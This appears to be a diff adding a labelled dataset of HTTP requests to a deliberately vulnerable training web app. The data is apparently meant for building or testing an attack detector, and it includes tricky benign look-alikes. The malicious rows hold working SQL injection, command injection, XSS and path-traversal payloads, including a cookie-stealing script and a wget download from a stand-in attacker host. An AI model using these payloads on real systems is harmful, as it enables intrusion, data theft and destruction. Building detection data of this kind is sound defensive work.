@@ -1,0 +1,38 @@
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=1' UNION SELECT user,password FROM users-- -","body":"","label":"malicious","type":"sql_injection","note":"classic union"}
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=1 OR 1=1","body":"","label":"malicious","type":"sql_injection","note":"boolean"}
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=1' OR '1'='1","body":"","label":"malicious","type":"sql_injection","note":"quoted or"}
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=1'; DROP TABLE users-- -","body":"","label":"malicious","type":"sql_injection","note":"stacked drop"}
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=1' AND SLEEP(5)-- -","body":"","label":"malicious","type":"sql_injection","note":"time-based blind"}
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=1 UNION SELECT table_name,2 FROM information_schema.tables","body":"","label":"malicious","type":"sql_injection","note":"schema enum"}
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=1' uNiOn sElEcT 1,2-- -","body":"","label":"malicious","type":"sql_injection","note":"case obfuscation"}
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=1'/**/UNION/**/SELECT/**/1,2-- -","body":"","label":"malicious","type":"sql_injection","note":"inline-comment obfuscation (regex-evasive)"}
+{"method":"POST","path":"/vulnerabilities/exec/","query":"","body":"ip=127.0.0.1;cat /etc/passwd","label":"malicious","type":"command_injection","note":"semicolon cat"}
+{"method":"POST","path":"/vulnerabilities/exec/","query":"","body":"ip=127.0.0.1 | whoami","label":"malicious","type":"command_injection","note":"pipe"}
+{"method":"POST","path":"/vulnerabilities/exec/","query":"","body":"ip=1.1.1.1 && id","label":"malicious","type":"command_injection","note":"and-chain"}
+{"method":"POST","path":"/vulnerabilities/exec/","query":"","body":"ip=$(reboot)","label":"malicious","type":"command_injection","note":"cmd substitution"}
+{"method":"POST","path":"/vulnerabilities/exec/","query":"","body":"ip=`uname -a`","label":"malicious","type":"command_injection","note":"backtick"}
+{"method":"POST","path":"/vulnerabilities/exec/","query":"","body":"ip=127.0.0.1; wget http://evil.example/sh -O /tmp/x","label":"malicious","type":"command_injection","note":"stager download"}
+{"method":"GET","path":"/vulnerabilities/xss_r/","query":"name=<script>alert(1)</script>","body":"","label":"malicious","type":"xss","note":"script tag"}
+{"method":"GET","path":"/vulnerabilities/xss_r/","query":"name=<img src=x onerror=alert(1)>","body":"","label":"malicious","type":"xss","note":"img onerror"}
+{"method":"GET","path":"/vulnerabilities/xss_r/","query":"name=<svg/onload=alert(1)>","body":"","label":"malicious","type":"xss","note":"svg onload"}
+{"method":"GET","path":"/vulnerabilities/xss_r/","query":"name=javascript:alert(document.cookie)","body":"","label":"malicious","type":"xss","note":"js uri"}
+{"method":"GET","path":"/vulnerabilities/xss_r/","query":"name=%3Cscript%3Ealert(1)%3C/script%3E","body":"","label":"malicious","type":"xss","note":"url-encoded script"}
+{"method":"GET","path":"/vulnerabilities/fi/","query":"page=../../../../etc/passwd","body":"","label":"malicious","type":"path_traversal","note":"classic traversal"}
+{"method":"GET","path":"/vulnerabilities/fi/","query":"page=....//....//etc/passwd","body":"","label":"malicious","type":"path_traversal","note":"filter-bypass traversal"}
+{"method":"GET","path":"/vulnerabilities/fi/","query":"page=%2e%2e%2f%2e%2e%2fetc/passwd","body":"","label":"malicious","type":"path_traversal","note":"encoded traversal"}
+{"method":"GET","path":"/vulnerabilities/fi/","query":"page=..\\..\\..\\windows\\win.ini","body":"","label":"malicious","type":"path_traversal","note":"windows traversal"}
+{"method":"GET","path":"/login.php","query":"","body":"","label":"benign","type":"benign","note":"plain page"}
+{"method":"GET","path":"/index.php","query":"","body":"","label":"benign","type":"benign","note":"home"}
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=1&Submit=Submit","body":"","label":"benign","type":"benign","note":"legit lookup"}
+{"method":"GET","path":"/vulnerabilities/sqli/","query":"id=42","body":"","label":"benign","type":"benign","note":"legit numeric id"}
+{"method":"GET","path":"/vulnerabilities/fi/","query":"page=include.php","body":"","label":"benign","type":"benign","note":"legit include"}
+{"method":"POST","path":"/guestbook.php","query":"","body":"name=Alice&message=Hello there, great site!","label":"benign","type":"benign","note":"normal comment"}
+{"method":"GET","path":"/search.php","query":"q=laptop deals","body":"","label":"benign","type":"benign","note":"normal search"}
+{"method":"POST","path":"/guestbook.php","query":"","body":"name=O'Brien&message=thanks","label":"benign","type":"benign","note":"HARD: apostrophe in a real name"}
+{"method":"GET","path":"/search.php","query":"q=union meeting schedule","body":"","label":"benign","type":"benign","note":"HARD: the word union"}
+{"method":"POST","path":"/guestbook.php","query":"","body":"name=Sam&message=I love my cat; she is so cute","label":"benign","type":"benign","note":"HARD: semicolon + cat"}
+{"method":"GET","path":"/search.php","query":"q=please select a date for the meeting","body":"","label":"benign","type":"benign","note":"HARD: the word select"}
+{"method":"GET","path":"/search.php","query":"q=drop by the office anytime","body":"","label":"benign","type":"benign","note":"HARD: the word drop"}
+{"method":"POST","path":"/guestbook.php","query":"","body":"name=Dan&message=check the script for act 1 of the play","label":"benign","type":"benign","note":"HARD: the word script"}
+{"method":"GET","path":"/search.php","query":"q=SELECT the best option from the list","body":"","label":"benign","type":"benign","note":"HARD: SELECT ... from in English"}
+{"method":"POST","path":"/guestbook.php","query":"","body":"name=<3&message=love this","label":"benign","type":"benign","note":"HARD: <3 is not a tag"}
